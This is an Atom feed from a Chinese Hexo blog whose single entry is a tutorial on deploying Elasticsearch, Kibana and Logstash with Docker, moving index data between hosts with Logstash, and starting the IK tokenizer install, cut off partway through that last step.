<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木子</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzimz.cn/"/>
  <updated>2020-02-21T05:01:07.316Z</updated>
  <id>https://muzimz.cn/</id>
  
  <author>
    <name>木子</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ElasticSearch、kibana、logstash</title>
    <link href="https://muzimz.cn/2020/01/10/ElasticSearch%E3%80%81kibana%E3%80%81logstash/"/>
    <id>https://muzimz.cn/2020/01/10/ElasticSearch、kibana、logstash/</id>
    <published>2020-01-10T15:20:51.000Z</published>
    <updated>2020-02-21T05:01:07.316Z</updated>
    
    <content type="html"><![CDATA[<center><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=21287732,2992447167&fm=26&gp=0.jpg"></center><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Elasticsearch是什么？既然它是英文的，我们不妨借助有道从<code>Elasticsearch</code>这几个字母出发来看看其字面上所表达的意思吧。其分为elastic和search两个独立的单词，既然如此，我们无脑有道一波，得到的解释如下：<br>从有道的解释来看，我们可以简单的对其理解为：<font color="red">Elasticsearch是及其具有弹性的、灵活的、像松紧带一样的且可供搜寻检索的一款工具。</font>o(*≧▽≦)ツ┏━┓</p><p>百度百科对其解释如下：</p><blockquote><p>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。ElasticSearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache、Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。</p></blockquote><p>从如上信息我们可以得知，Elasticsearch是一款实时、分布式存储的搜索引擎，在实际开发过程中，我们常常会把数据放在Elasticsearch搜索引擎中，然后从引擎中去实际需要的数据。而且在实际搜索过程中，我们也会有许多的Api支持来对数据进行检索，比如排序、条件查询等，其中在Elasticsearch中最为强大之处就是他的模糊检索功能。讲到这，可能有些Mysql经验但没接触过Elasticsearch的朋友可能会有个疑问，Mysql大法不是无敌么，其中的<code>like</code>语句不能模糊查询么？<code>where and</code>不能条件检索么？<code>orderby</code>不能对数据进行排序么？我随随便便就信手拈来一个Sql语句不就能实现业务的需求么：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> department_name, <span class="built_in">count</span>(*) 员工个数</span><br><span class="line"><span class="keyword">from</span> departments d, employees <span class="built_in">e</span></span><br><span class="line"><span class="keyword">where</span> d.department_id = <span class="built_in">e</span>.department_id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> d.department_id</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">count</span>(*)&gt;<span class="number">5</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">count</span>(*) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><a id="more"></a><p>是这样没错，以上SQL代码的确能够实现实际需求，但是当我们的业务逐渐变得复杂、庞大，我们的用户量越来越多，我们就不得不站在用户的角度来想想了。试想一下，假设哪些淘宝er每天打开淘宝搜索自己想要的数据时都要等个几十秒，那会是怎样的一种画面。又比如，在打开我们常见文件来检索我们需要数据的时候，比如txt、word、excel，我们一般都能迅速打开，那是因为这些文件占用实际空间都太小，这些文件大多就几kb，假设我们打开一个以G为单位的日志文件，此时的系统还能像以往那样正常么？换言之，Elasticsearch采用的是索引搜索，能够具有强大的搜索能力，能够达到实时搜索，稳定，可靠，快速，安装的效用。</p><p>另外，Elasticsearch在处理日志的过程中，其常常与数据收集和日志解析引擎Logstash以及名为Kibana的分析和可视化平台配合使用，也就是常说的<code>ELK</code>系统。文本将主要介绍以下几个方面的内容</p><ul><li>基于Docker容器来搭建ELK系统</li><li>Elasticsearch集群的搭建</li><li>在Elasticsearch中引入IK分词器插件</li><li>重点讲解基于<code>SpringData Es</code>来对Elasticsearch进行操作</li><li>最后基于本小程序中数据库中的数据来熟练操作Elasticsearch</li></ul><h2 id="ELK系统的搭建"><a href="#ELK系统的搭建" class="headerlink" title="ELK系统的搭建"></a>ELK系统的搭建</h2><blockquote><p>Elasticsearch是实时全文搜索和分析引擎，提供搜集、分析、存储数据三大功能；是一套开放REST和JAVA API等结构提供高效搜索功能，可扩展的分布式系统。它构建于Apache Lucene搜索引擎库之上。</p><p>Logstash是一个用来搜集、分析、过滤日志的工具。它支持几乎任何类型的日志，包括系统日志、错误日志和自定义应用程序日志。它可以从许多来源接收日志，这些来源包括 syslog、消息传递（例如 RabbitMQ）和JMX，它能够以多种方式输出数据，包括电子邮件、websockets和Elasticsearch。<br>1<br>Kibana是一个基于Web的图形界面，用于搜索、分析和可视化存储在 Elasticsearch指标中的日志数据。它利用Elasticsearch的REST接口来检索数据，不仅允许用户创建他们自己的数据的定制仪表板视图，还允许他们以特殊的方式查询和过滤数据</p></blockquote><center><img src="http://img4.mukewang.com/5afc1f4800018b1205000265.jpg"></center><center>注：图片来源网络</center><p>总结就是Elasticsearch用于搜索，Kibana用于可视化，Logstash用于搜集。下面我们来基于Docker来搭建一下ELK系统，关于Docker的安装及基本使用，前面的文章已经有过记录了，此处不再过多的介绍。另外，值得注意的是这三者之间的版本关系，（如果使用其他版本的工具，则按照如下方式搭建可能会产生其他问题）：</p><ul><li>Elasticsearch:5.6.8</li><li>Kibana:5.6.8</li><li>Logstash:lastest</li></ul><h3 id="Elasticsearch的安装"><a href="#Elasticsearch的安装" class="headerlink" title="Elasticsearch的安装"></a>Elasticsearch的安装</h3><ul><li><p>Docker拉取Elasticsearch镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">elasticsearch</span><span class="selector-pseudo">:5.6.8</span></span><br></pre></td></tr></table></figure></li><li><p>在本地创建elasticsearch容器所映射的配置文件以及data目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在centos本地创建配置文件，并配置</span></span><br><span class="line">mkdir -p /resources/elasticsearch<span class="built_in">/config </span>       # 创建config目录</span><br><span class="line">mkdir -p /resources/elasticsearch/data             # 创建data目录</span><br><span class="line"><span class="comment"># 将http.host配置为0.0.0.0的授权对象，将配置写入config目录下的elasticsearch.yml配置文件中</span></span><br><span class="line">echo <span class="string">"http.host: 0.0.0.0"</span> &gt;&gt; /resources/elasticsearch/config/elasticsearch.yml</span><br></pre></td></tr></table></figure></li><li><p>创建一个elasticsearch容器，并开机自运行</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 创建容器并开机运行（single-node表示单节点模式，后面会介绍集群方式下elasticsearch的搭建）</span></span><br><span class="line"><span class="meta"># 注意：在docker中\表示换行</span></span><br><span class="line">docker run --name elasticsearch -p <span class="number">9200</span>:<span class="number">9200</span> \</span><br><span class="line">-e <span class="string">"discovery.type=single-node"</span> \</span><br><span class="line">-e ES_JAVA_OPTS=<span class="string">"-Xms256m -Xmx256m"</span> \</span><br><span class="line">-v /resources/elasticsearch/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \</span><br><span class="line">-v /resources/elasticsearch/data:/usr/share/elasticsearch/data -d elasticsearch:<span class="number">5.6</span><span class="number">.8</span></span><br><span class="line"><span class="meta"># 参数介绍：</span></span><br><span class="line"><span class="meta"># --name：为容器起一个别名</span></span><br><span class="line"><span class="meta"># -p：将容器的运行端口映射到本地端口</span></span><br><span class="line"><span class="meta"># -e "discovery.type=single-node"：表示单节点模式下创建，后文将介绍集群模式的搭建</span></span><br><span class="line"><span class="meta"># -v：表示将容器中的配置文件和data文件映射到上文本地所创建的文件，方便后面的配置</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 将elasticsearch容器设置为开机自启动</span></span><br><span class="line">docker update <span class="keyword">new</span>-elasticsearch --restart=always</span><br></pre></td></tr></table></figure></li></ul><p>这样一来，我们便安装好elasticsearch了，我们可以使用<code>curl</code>命令来测试一下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 使用curl来访问elasticsearch的运行端口</span></span><br><span class="line">curl localhost:<span class="number">9200</span></span><br><span class="line"><span class="meta"># 运行输出结果如下则成功安装</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span> : <span class="string">"XwmNOpR"</span>,</span><br><span class="line">  <span class="string">"cluster_name"</span> : <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="string">"cluster_uuid"</span> : <span class="string">"yB3VNHxmQzevk1vXUQTkcg"</span>,</span><br><span class="line">  <span class="string">"version"</span> : &#123;</span><br><span class="line">    <span class="string">"number"</span> : <span class="string">"5.6.8"</span>,</span><br><span class="line">    <span class="string">"build_hash"</span> : <span class="string">"688ecce"</span>,</span><br><span class="line">    <span class="string">"build_date"</span> : <span class="string">"2018-02-16T16:46:30.010Z"</span>,</span><br><span class="line">    <span class="string">"build_snapshot"</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"lucene_version"</span> : <span class="string">"6.6.1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"tagline"</span> : <span class="string">"You Know, for Search"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当然了，我们也可以使用浏览器来对其进行访问，访问方式为<code>http://[ip]:9200</code>，端口为虚拟机ip，同样可以得到对应的结果，另外如果使用的是阿里云或腾讯云服务器，则需要在控制台中配置相应的安全组，否则无法访问<br><img></p><h3 id="安装kibana"><a href="#安装kibana" class="headerlink" title="安装kibana"></a>安装kibana</h3><ul><li><p>Docker拉取Kibana镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker拉取Kibana镜像</span></span><br><span class="line"><span class="attribute">docker</span> pull kibana:<span class="number">5</span>.<span class="number">6</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure></li><li><p>创建容器并设置开机自启动</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建容器kibana容器，对应的参数如上，另外需要指定elasticsearch的地址</span></span><br><span class="line">docker run --name kibana -e ELASTICSEARCH_URL=http://[ip]:9200 -p 5601:5601 \</span><br><span class="line">-d kibana:5.6.8</span><br><span class="line"><span class="comment"># 配置开机自启动</span></span><br><span class="line">docker update<span class="built_in"> new-kibana </span>--restart=always</span><br></pre></td></tr></table></figure></li></ul><p>安装完成之后，我们便可curl一下kibana的地址，或在浏览器访问<code>http://[ip]:5601</code>即可：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@iZm5eei156c9h3hrdjpe77Z ~]<span class="comment"># curl localhost:5601</span></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> hashRoute = <span class="string">'/app/kibana'</span>;</span><br><span class="line"><span class="keyword">var</span> defaultRoute = <span class="string">'/app/kibana'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hash = <span class="built_in">window</span>.location.hash;</span><br><span class="line"><span class="keyword">if</span> (hash.length) &#123;</span><br><span class="line">  <span class="built_in">window</span>.location = hashRoute + hash;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">window</span>.location = defaultRoute;</span><br><span class="line">&#125;&lt;/script&gt;[root@iZm5eei156c9h3hrdjpe77Z ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img></p><h3 id="安装logstash"><a href="#安装logstash" class="headerlink" title="安装logstash"></a>安装logstash</h3><ul><li><p>拉取Logstash镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line"><span class="attribute">docker</span> pull logstash</span><br></pre></td></tr></table></figure></li><li><p>创建一个配置文件，并进行input和output的配置</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在/resources/logstash中创建logstash.conf文件，并使用vim来对其进行编辑</span></span><br><span class="line">mkdir /resources/logstash</span><br><span class="line"><span class="comment"># 使用vim编辑</span></span><br><span class="line">vim logstash.conf</span><br><span class="line"><span class="comment"># 配置文件内容如下，更换为自己Elasticsearch的ip即可</span></span><br><span class="line"><span class="keyword">input</span> &#123;</span><br><span class="line">    tcp &#123;</span><br><span class="line">        <span class="attr">port</span> =&gt; <span class="number">4560</span></span><br><span class="line">        <span class="attr">codec</span> =&gt; json_lines</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output&#123;</span><br><span class="line">  <span class="keyword">elasticsearch</span> &#123; </span><br><span class="line">  <span class="attr">hosts</span> =&gt; [<span class="string">"[ip]:9200"</span>] </span><br><span class="line">  <span class="attr">index</span> =&gt; <span class="string">"applog"</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">stdout</span> &#123; <span class="attr">codec</span> =&gt; rubydebug &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建容器并开机自启动</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建容器，这里需要指明Elasticsearch来进行链接</span></span><br><span class="line">docker run -d -p 4560:4560 \</span><br><span class="line">-v /resources/logstash/logstash.conf:/etc/logstash.conf \</span><br><span class="line">--link elasticsearch:elasticsearch \</span><br><span class="line">--name logstash logstash \</span><br><span class="line">logstash -f /etc/logstash.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机自启动</span></span><br><span class="line">docker update<span class="built_in"> new-logstash </span>--restart=always</span><br></pre></td></tr></table></figure></li><li><p>以上便是Logstash的安装过程，我们可以进入Logstash容器内来简单的使用以下</p></li></ul><p>进入Logstash容器，并cd到bin目录<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it logstash <span class="regexp">/bin/</span>bash</span><br><span class="line">cd <span class="regexp">/usr/</span>share<span class="regexp">/logstash/</span>bin</span><br></pre></td></tr></table></figure></p><p>执行logstash命令<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 注意：需要这里需要指定--<span class="built_in">path</span>.<span class="keyword">data</span>参数，否则在运行的过程会出错</span><br><span class="line">logstash -e <span class="string">'input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;'</span> --<span class="built_in">path</span>.<span class="keyword">data</span>=/root/</span><br></pre></td></tr></table></figure></p><p>运行之后，我们在控制台输入hello world，即会出现以下结果<br><img src=""></p><h2 id="基于Logstash对Elasticsearch索引库中数据的导入和导出"><a href="#基于Logstash对Elasticsearch索引库中数据的导入和导出" class="headerlink" title="基于Logstash对Elasticsearch索引库中数据的导入和导出"></a>基于Logstash对Elasticsearch索引库中数据的导入和导出</h2><p>应用需求：在192.168.220.201主机中的es中并没有info索引库，而192.168.220.202中的es有info索引库，此时我们可以尝试借助logstash来先将skuinfo索引库从192.168.220.202导出成一个json文件，然后将该文件借助logstash导入到192.168.220.201的es索引库中。</p><h3 id="使用logstash将es数据从索引库中导出"><a href="#使用logstash将es数据从索引库中导出" class="headerlink" title="使用logstash将es数据从索引库中导出"></a>使用logstash将es数据从索引库中导出</h3><p>创建一个临时的文件夹，用于保存导出的数据以及配置文件<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /resources/mydata/logstash_temp</span><br></pre></td></tr></table></figure></p><p>使用vim来创建一个export.conf配置文件，并对其进行配置<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> export.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure></p><p>export.conf文件内容如下<br><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  将192.168.220.202 Elasticsearch中info索引库导出为一个info.json文件</span></span><br><span class="line">input&#123;</span><br><span class="line">     <span class="keyword">elasticsearch</span> &#123;</span><br><span class="line">        <span class="attr">hosts</span> =&gt; [<span class="string">"192.168.220.202:9200"</span>]   <span class="comment"># 指定Elasticsearch的地址，该地址中含有目标数据</span></span><br><span class="line">                <span class="attr">index</span> =&gt; <span class="string">"info"</span>             <span class="comment"># 指定需要导出的索引库</span></span><br><span class="line">                <span class="attr">size</span> =&gt; <span class="number">200</span>                 <span class="comment"># 指定每次导出数据每批次的大小，注意不能设置太大，否则会出错</span></span><br><span class="line">            <span class="attr">scroll</span> =&gt; <span class="string">"5m"</span></span><br><span class="line">                <span class="attr">docinfo</span> =&gt; <span class="keyword">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output&#123;</span><br><span class="line">   <span class="keyword">file</span> &#123;</span><br><span class="line">     <span class="attr">path</span> =&gt; <span class="string">"skuinfo.json"</span>                 <span class="comment"># 指定保存的数据路径和json文件的名称</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>使用<code>docker cp</code>命令将该导出的配置文件复制的logstash容器的bin目录中<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将<span class="meta">export</span>.conf文件<span class="meta">cp</span>到logstash容器中</span><br><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span> ./<span class="meta">export</span>.conf logstash:/usr/share/logstash/<span class="keyword">bin</span></span><br></pre></td></tr></table></figure></p><p>进入logstash容器，并执行配置文件<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入logstash，然后执行配置文件</span></span><br><span class="line">docker exec -it logstash <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/logstash/bin</span></span><br><span class="line"><span class="string">./logstash</span> -f <span class="string">./export.conf</span> <span class="params">--path</span>.data=<span class="string">/root/</span> <span class="comment"># 务必要指定path.data属性，不然会报错</span></span><br></pre></td></tr></table></figure></p><p>执行完成之后便会在当前目录下产生一个info.json文件，将该数据文件导出到centos中<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行完成之后就会在当前目录下产生一个info.json文件，将该文件导出到centos中</span></span><br><span class="line">docker cp logstash:<span class="regexp">/usr/</span>share<span class="regexp">/logstash/</span>bin<span class="regexp">/info.json /</span>resources<span class="regexp">/mydata/</span></span><br></pre></td></tr></table></figure></p><p>即可完成将索引库中的数据导出成一个json文件，该文件存在于/resources/mydata/info.json </p><h3 id="logstash对Elasticsearch索引库中数据的导入"><a href="#logstash对Elasticsearch索引库中数据的导入" class="headerlink" title="logstash对Elasticsearch索引库中数据的导入"></a>logstash对Elasticsearch索引库中数据的导入</h3><ul><li><p>完成json数据的导入及conf文件的配置</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1.</span> 将<span class="number">192.168</span><span class="number">.220</span><span class="number">.202</span>中的info.json文件使用xftp工具导入到windows本地</span><br><span class="line"># <span class="number">2.</span> 将该文件通过xftp工具导入到<span class="number">192.168</span><span class="number">.220</span><span class="number">.201</span> /resources/mydata/logstash_temp中</span><br><span class="line">cd /mydata/mysources/logstash_temp</span><br><span class="line"># 使用vim对import.conf进行配置</span><br><span class="line">vim import.conf</span><br></pre></td></tr></table></figure></li><li><p>import.conf的配置文件如下</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取json文件</span></span><br><span class="line"><span class="keyword">input</span> &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    <span class="comment"># 设置json文件路径，多个文件路径可设置成数组[]，模糊匹配用*</span></span><br><span class="line">    <span class="attr">path</span> =&gt; <span class="string">"/root/skuinfo.json"</span></span><br><span class="line">    <span class="attr">start_position</span> =&gt; <span class="string">"beginning"</span></span><br><span class="line">    <span class="comment"># 设置编码</span></span><br><span class="line">    <span class="attr">codec</span> =&gt; json &#123;<span class="attr">charset</span> =&gt; <span class="string">"UTF-8"</span>&#125;</span><br><span class="line">    # 当存在多个文件的时候可使用type指定输入输出路径</span><br><span class="line">    type =&gt; <span class="string">"json_index"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤格式化数据</span></span><br><span class="line"><span class="keyword">filter</span> &#123;</span><br><span class="line">    mutate&#123;</span><br><span class="line">        <span class="comment">#删除无效的字段</span></span><br><span class="line">        <span class="attr">remove_field</span> =&gt; [<span class="string">"@version"</span>,<span class="string">"message"</span>,<span class="string">"host"</span>,<span class="string">"path"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    # 新增timestamp字段，将@timestamp时间增加8小时</span><br><span class="line">    <span class="keyword">ruby</span> &#123; <span class="attr">code</span> =&gt; <span class="string">"event.set('timestamp', event.get('@timestamp').time.localtime + 8*60*60)"</span> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据输出到ES</span></span><br><span class="line"><span class="keyword">output</span> &#123;</span><br><span class="line">    <span class="comment">#日志输出格式，json_lines;rubydebug等</span></span><br><span class="line">    stdout &#123;</span><br><span class="line">        <span class="attr">codec</span> =&gt; rubydebug</span><br><span class="line">    &#125;</span><br><span class="line">    #输出到es</span><br><span class="line">    if[type] == <span class="string">"json_index"</span>&#123;</span><br><span class="line">        <span class="comment">#无法解析的json不记录到elasticsearch中</span></span><br><span class="line">        if <span class="string">"_jsonparsefailure"</span> not in [tags] &#123;</span><br><span class="line">            <span class="keyword">elasticsearch</span> &#123;</span><br><span class="line">                <span class="comment">#es地址ip端口</span></span><br><span class="line">                <span class="attr">hosts</span> =&gt; <span class="string">"192.168.220.201:9200"</span></span><br><span class="line">                <span class="comment"># 配置数据转入到es中的</span></span><br><span class="line">                <span class="attr">index</span> =&gt; <span class="string">"info"</span></span><br><span class="line">                <span class="comment">#类型</span></span><br><span class="line">                <span class="attr">document_type</span> =&gt; <span class="string">"skuinfo"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>完成import.conf文件的配置之后，我们即可来真正实现数据导入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将import.conf文件和info.json文件导入到logstash容器中</span></span><br><span class="line">docker cp <span class="string">./import.conf</span> logstash:<span class="string">/usr/share/logstash/bin</span>    <span class="comment"># 导入conf配置文件</span></span><br><span class="line">docker cp <span class="string">./skuinfo.json</span> logstash:<span class="string">/root/</span>                    <span class="comment"># 导入json数据文件，导入的路径注意与conf配置文件中的配置路径保持一致</span></span><br><span class="line"><span class="comment"># 进入到logstash容器中，并执行logstash命令完成数据的导入</span></span><br><span class="line">docker exec -it logstash <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/share/logstash/bin</span></span><br><span class="line"><span class="string">./logstash</span> -f <span class="string">./import.conf</span> <span class="params">--path</span>.data=<span class="string">/root/</span></span><br></pre></td></tr></table></figure></li></ul><p>等待执行完成之后访问192.168.220.201:5601即可访问到info索引库中的数据<br><img></p><h2 id="安装ik中文分词器"><a href="#安装ik中文分词器" class="headerlink" title="安装ik中文分词器"></a>安装ik中文分词器</h2><h3 id="ik中文分词器插件的安装"><a href="#ik中文分词器插件的安装" class="headerlink" title="ik中文分词器插件的安装"></a>ik中文分词器插件的安装</h3><p>坑一：我们安装ik分词器的时候，一般是在github中来下载zip文件，然后传送到centos中，最后再上传到elasticserch容器中，但是github中标明的版本与实际版本根本不相同。另一方面，在我们下载不同版本的elasticsearch时，有的版本容器运行会出错，有些正常。所以我们以后我们搭建elk的时候就同一安装5.6.8版本（一定要注意）</p><p>坑二：我们一般在github上下载zip文件（无论什么文件）的时候会非常非常的慢（不是一般的慢），所以我们以后在使用github来下载的时候可以借助gitee（码云）来下载，在码云中创建一个仓库的时候，选择导入已有的仓库，然后将原github的git连接复制粘贴上去，最后create。一旦创建，我们就可以借助码云中来间接下载github仓库的任何文件，且下载的速度会大大加快</p><p>ik分词器链接：<a href="https://gitee.com/tianxingjian123/elasticsearch-analysis-ik" target="_blank" rel="noopener">https://gitee.com/tianxingjian123/elasticsearch-analysis-ik</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ik分词器链接：https://gitee.com/tianxingjian123/elasticsearch-analysis-ik</span></span><br><span class="line"><span class="comment"># 下载5.6.8的ik分词器之后，我们需要使用maven将其打包</span></span><br><span 